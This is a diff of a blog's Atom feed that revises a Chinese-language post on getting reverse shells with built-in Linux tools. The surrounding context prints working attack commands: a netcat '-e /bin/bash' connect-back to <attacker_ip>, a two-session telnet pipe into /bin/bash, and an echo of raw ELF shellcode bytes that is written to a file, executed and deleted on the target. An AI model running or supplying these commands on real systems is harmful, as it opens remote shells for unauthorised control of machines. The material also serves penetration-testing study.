@@ -594,14 +594,13 @@
     <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
     <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
     <published>2018-01-30T07:58:01.000Z</published>
-    <updated>2018-02-04T10:27:43.000Z</updated>
+    <updated>2019-04-21T15:43:04.223Z</updated>
     
     <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
+<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。</li>
 <li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
-<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
-<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
-<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
+<li>下文中的几个例子在大多数的系统中是通用的。</li>
+<li>这里主要重点关注一下4和5<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
 <li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
@@ -623,12 +622,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
 <p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
 <ul>
-<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
+<li>这第五个其实挺有意思。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
 <li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
-<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
 <li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
 </ul>
 ]]></content>
@@ -636,8 +634,8 @@
     <summary type="html">
     
       &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。&lt;/li&gt;
-&lt;li&gt;linux(GNUx
+&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。&lt;/li&gt;
+&lt;li&gt;linux(GNUx)有
     
     </summary>
     
